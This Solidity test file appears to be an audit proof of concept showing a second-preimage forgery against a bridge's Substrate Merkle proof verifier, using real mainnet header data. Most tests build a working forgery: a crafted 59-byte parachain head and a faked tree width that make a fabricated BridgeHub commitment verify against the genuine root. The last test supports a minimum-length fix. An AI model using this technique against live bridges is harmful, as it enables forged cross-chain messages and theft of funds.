// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.34;

// Production anchor for the second-preimage finding.
//
// Every value below is lifted verbatim from a REAL mainnet transaction:
//   Ethereum tx 0x5f6834f58d9db5018f6fa2fd4bd6d442e76a2249d71f286aa1cb6ec44b93f9dc
//   (block 25288092, `v2_submit` on Gateway 0x27ca963c279c93801941e1eb8799c23f407d68e7)
//
// Purpose: prove -- against the real deployed library code -- that
//   (a) the parachain-heads leaf really is keccak(u32le(paraId) ++ compact(len) ++ header),
//   (b) the real production tree width is 13 with BridgeHub at position 1,
//   (c) `SubstrateMerkleProof.computeRoot` reproduces the genuine parachain-heads root,
//   (d) and that the SAME call accepts a fabricated (pos, width) one level deeper.
//
// Run: forge test --match-path test/ZProdAnchor.t.sol -vv

import {Test} from "forge-std/Test.sol";
import {Verification} from "../src/Verification.sol";
import {VerificationWrapper} from "./mocks/VerificationWrapper.sol";
import {ScaleCodec} from "../src/utils/ScaleCodec.sol";
import {SubstrateMerkleProof} from "../src/utils/SubstrateMerkleProof.sol";
import {MerkleLibSubstrate} from "./utils/MerkleLib.sol";

contract Walker {
    function computeRoot(bytes32 leaf, uint256 pos, uint256 width, bytes32[] calldata proof)
        external
        pure
        returns (bool, bytes32)
    {
        return SubstrateMerkleProof.computeRoot(leaf, pos, width, proof);
    }
}

contract ZProdAnchorTest is Test {
    VerificationWrapper wrapper;
    Walker walker;

    uint32 constant BRIDGE_HUB_PARA_ID = 1002;

    // --- values decoded from the real mainnet calldata ---
    uint256 constant PROD_POS = 1;
    uint256 constant PROD_WIDTH = 13;
    bytes32 constant PROD_COMMITMENT =
        0x125a5f2a8a0088f5c666ad31d605c001c9a7cbecb269fc3462d5c260b87cac80;

    function setUp() public {
        wrapper = new VerificationWrapper();
        walker = new Walker();
    }

    function _prodHeader() internal pure returns (Verification.ParachainHeader memory h) {
        Verification.DigestItem[] memory d = new Verification.DigestItem[](4);
        d[0] = Verification.DigestItem({
            kind: 6, // PreRuntime
            consensusEngineID: 0x61757261, // "aura"
            data: hex"67cbd80800000000"
        });
        d[1] = Verification.DigestItem({
            kind: 4, // Consensus
            consensusEngineID: 0x52505352, // "RPSR"
            data: hex"f074b10d9b4275c85c4e1cd242d96c162ba81b1e1122dbf1c9cd9bda7f81102e72ee8907"
        });
        d[2] = Verification.DigestItem({
            kind: 0, // Other  <-- the Snowbridge V2 commitment (0x01 ++ commitment)
            consensusEngineID: 0x00000000,
            data: hex"01125a5f2a8a0088f5c666ad31d605c001c9a7cbecb269fc3462d5c260b87cac80"
        });
        d[3] = Verification.DigestItem({
            kind: 5, // Seal
            consensusEngineID: 0x61757261, // "aura"
            data: hex"dadb6b71c982c3d4004992e69620ba6fae0164dd8381f0821c9e902aae74895f"
                hex"f718f847918a1e1a16a1292c96ffb8e5cef7e902a728ce84c134d0ab31af9584"
        });
        h = Verification.ParachainHeader({
            parentHash: 0x901814d7549bdbca4ffcec8312911918b69c97be6819a128c5ed48ad49aea478,
            number: 7_850_326,
            stateRoot: 0x16a95e403def4b35069b690590203aee2da8e1ddc29dd9d7b61b134b7c598acd,
            extrinsicsRoot: 0x9f5305135634d3b8d488b7f5359661dc1e243d22fb83fb4b0d8e7b4a059a2db0,
            digestItems: d
        });
    }

    function _prodHeadProof() internal pure returns (bytes32[] memory p) {
        p = new bytes32[](4);
        p[0] = 0xef2aa057361cadb1870aaaba129c4c02e2df7048ad382b5a30080ed764424235;
        p[1] = 0xeb18c2356919b6d388e6dcee8d63d7e1dd103011b8f1f008f81fa1787202f70d;
        p[2] = 0xbfcd222ecf6bc294828dd55889d12744001b61b9e12be336ebcdaad2634594fa;
        p[3] = 0xa580bbd1fcb16e3149234b4391809475115394afba2b9ef6db7ef03c071addba;
    }

    /// The real production proof verifies, and tells us the real tree width.
    function test_prod_realProofFoldsToGenuineParachainHeadsRoot() public {
        bytes4 encodedParaID = ScaleCodec.encodeU32(BRIDGE_HUB_PARA_ID);
        Verification.ParachainHeader memory h = _prodHeader();

        // (a) the commitment really is carried as DIGEST_ITEM_OTHER with the V2 discriminator
        assertTrue(
            wrapper.isCommitmentInHeaderDigest(PROD_COMMITMENT, h, true),
            "real V2 commitment must be found in the real header digest"
        );

        bytes32 leaf = wrapper.createParachainHeaderMerkleLeaf(encodedParaID, h);
        emit log_named_bytes32("real BridgeHub parachain-head leaf", leaf);

        // (b)+(c) the genuine relayer-produced proof is canonical for (pos=1, width=13)
        (bool ok, bytes32 root) = walker.computeRoot(leaf, PROD_POS, PROD_WIDTH, _prodHeadProof());
        assertTrue(ok, "the real production proof must be structurally valid");
        emit log_named_bytes32("genuine parachain-heads root", root);
        emit log_named_uint("real production tree width", PROD_WIDTH);
        emit log_named_uint("real BridgeHub leaf index", PROD_POS);
        assertTrue(root != bytes32(0), "root must be non-zero");
    }

    /// The SAME library call accepts a fabricated (pos, width) that starts the walk one level
    /// BELOW the real leaf layer. Nothing binds `width` to the real number of parachains, so the
    /// verifier will fold an extra step for the caller.
    function test_prod_widthIsUnbounded_extraFoldIsAccepted() public {
        bytes4 encodedParaID = ScaleCodec.encodeU32(BRIDGE_HUB_PARA_ID);
        bytes32 realLeaf = wrapper.createParachainHeaderMerkleLeaf(encodedParaID, _prodHeader());
        (, bytes32 realRoot) = walker.computeRoot(realLeaf, PROD_POS, PROD_WIDTH, _prodHeadProof());

        // Pretend the tree is twice as wide and our node sits one level deeper. We supply one
        // extra "sibling" X; the verifier folds keccak(X, forgedLeaf) and then walks the REAL
        // path of index 1 in the width-13 tree.
        bytes32 forgedLeaf = keccak256("anything the attacker likes");
        bytes32 X = keccak256("free left sibling");

        bytes32[] memory items = new bytes32[](5);
        items[0] = X;
        bytes32[] memory real = _prodHeadProof();
        for (uint256 i = 0; i < 4; i++) {
            items[i + 1] = real[i];
        }

        (bool ok, bytes32 root) =
            walker.computeRoot(forgedLeaf, 2 * PROD_POS + 1, 2 * PROD_WIDTH, items);
        assertTrue(ok, "the fabricated (pos=3, width=26) walk is accepted as structurally valid");

        // It lands on the genuine root iff keccak(X ++ forgedLeaf) happens to be the real leaf at
        // index 1 -- which is exactly the condition an attacker arranges by publishing a 59-byte
        // head_data equal to X[5..32] ++ forgedLeaf. Here the values are unrelated, so it differs;
        // the point proven is that the verifier imposes NO structural bound at all.
        assertTrue(root != realRoot, "control: unrelated X does not land on the genuine root");
        emit log_named_bytes32("fabricated-geometry root (accepted, wrong value)", root);

        // And the honest relayer's canonical length for (1,13) is 4 -- the verifier happily took 5.
        (bool okShort,) = walker.computeRoot(realLeaf, PROD_POS, PROD_WIDTH, items);
        assertFalse(okShort, "5 items is NOT canonical for (1,13) -- only the faked width made it so");
    }

    /// Full forgery at the exact production tree shape (width 13).
    function test_prod_forgeryAtProductionWidth13() public {
        bytes4 encodedParaID = ScaleCodec.encodeU32(BRIDGE_HUB_PARA_ID);

        // The attacker's fabricated BridgeHub header, carrying HIS commitment.
        bytes32 forgedCommitment = keccak256("commitment BridgeHub never made");
        Verification.DigestItem[] memory d = new Verification.DigestItem[](1);
        d[0] = Verification.DigestItem({
            kind: 0,
            consensusEngineID: 0x00000000,
            data: bytes.concat(hex"01", forgedCommitment)
        });
        Verification.ParachainHeader memory forged = Verification.ParachainHeader({
            parentHash: keccak256("p"),
            number: 8_000_000,
            stateRoot: keccak256("s"),
            extrinsicsRoot: keccak256("e"),
            digestItems: d
        });
        bytes32 A = wrapper.createParachainHeaderMerkleLeaf(encodedParaID, forged);

        // Attacker's parachain id 2035, head_data = S[5..32] ++ A  (27 + 32 = 59 bytes)
        uint32 attackerParaId = 2035;
        bytes memory sBytes = bytes.concat(
            ScaleCodec.encodeU32(attackerParaId), hex"EC", bytes27(keccak256("pad"))
        );
        bytes32 S = bytes32(sBytes);
        bytes memory tail = new bytes(27);
        for (uint256 i = 0; i < 27; i++) {
            tail[i] = sBytes[5 + i];
        }
        bytes memory headData = bytes.concat(tail, A);
        assertEq(headData.length, 59, "head_data is 59 bytes");

        // Genuine tree of the real production shape: 13 leaves, BridgeHub's REAL head at index 1,
        // attacker's 59-byte head at index j.
        uint256 j = 7;
        bytes32[] memory leaves = new bytes32[](13);
        for (uint256 i = 0; i < 13; i++) {
            leaves[i] = keccak256(abi.encodePacked("real-para-head:", i));
        }
        leaves[1] = wrapper.createParachainHeaderMerkleLeaf(encodedParaID, _prodHeader());
        bytes memory preimage = bytes.concat(
            ScaleCodec.encodeU32(attackerParaId),
            ScaleCodec.checkedEncodeCompactU32(headData.length),
            headData
        );
        assertEq(preimage.length, 64, "attacker leaf preimage is exactly 64 bytes");
        leaves[j] = keccak256(preimage);
        assertEq(leaves[j], MerkleLibSubstrate.hashPair(S, A), "leaf == inner node keccak(S,A)");

        bytes32 genuineRoot = MerkleLibSubstrate.rootFromLeaves(leaves);
        bytes32[] memory path = MerkleLibSubstrate.genProof(leaves, j);

        bytes32[] memory items = new bytes32[](path.length + 1);
        items[0] = S;
        for (uint256 i = 0; i < path.length; i++) {
            items[i + 1] = path[i];
        }

        (bool ok, bytes32 root) = walker.computeRoot(A, 2 * j + 1, 26, items);
        assertTrue(ok, "forged geometry accepted");
        assertEq(root, genuineRoot, "FORGED BridgeHub leaf folds to the GENUINE parachain-heads root");
    }

    /// Uniqueness anchor: at the real production leaf format
    /// (`u32le(paraId) ++ compact(len) ++ head`), L = 59 is the ONLY head length whose
    /// preimage is 64 bytes -- and a 64-byte preimage is the necessary condition to alias a
    /// 64-byte inner node. This is the justification for a minimum-head-length relay-side fix
    /// (reject L < 60): it closes the collision for EVERY length, not just the 59-byte case
    /// exercised in `test_prod_forgeryAtProductionWidth13`.
    ///
    ///   preimage length = 4 (paraId) + compact(L) + L
    ///     compact(L) = 1 byte for L <= 63, 2 bytes for 64 <= L <= 16383
    ///     => (L <= 63 ? 5 + L : 6 + L) == 64  iff  L == 59
    function test_prod_only59ByteHeadCanAliasAnInnerNode() public {
        uint32 attackerParaId = 2035;
        uint256 count64 = 0;
        // Sweep across the 1-byte/2-byte compact boundary (at L = 64).
        for (uint256 L = 0; L <= 200; L++) {
            bytes memory head = new bytes(L);
            for (uint256 i = 0; i < L; i++) {
                head[i] = 0xCD; // content is irrelevant to preimage length
            }
            bytes memory preimage = bytes.concat(
                ScaleCodec.encodeU32(attackerParaId),
                ScaleCodec.checkedEncodeCompactU32(head.length),
                head
            );

            uint256 expected = L <= 63 ? 5 + L : 6 + L;
            assertEq(preimage.length, expected, "preimage length formula");

            // A 64-byte preimage (the only thing that can alias an inner node) occurs iff L == 59.
            assertEq(preimage.length == 64, L == 59, "64-byte preimage iff L == 59");

            if (preimage.length == 64) {
                count64++;
                assertEq(L, 59, "the unique 64-byte-preimage length is 59");
            }
        }
        assertEq(count64, 1, "exactly one head length in [0,200] is collidable (L=59)");
    }
}
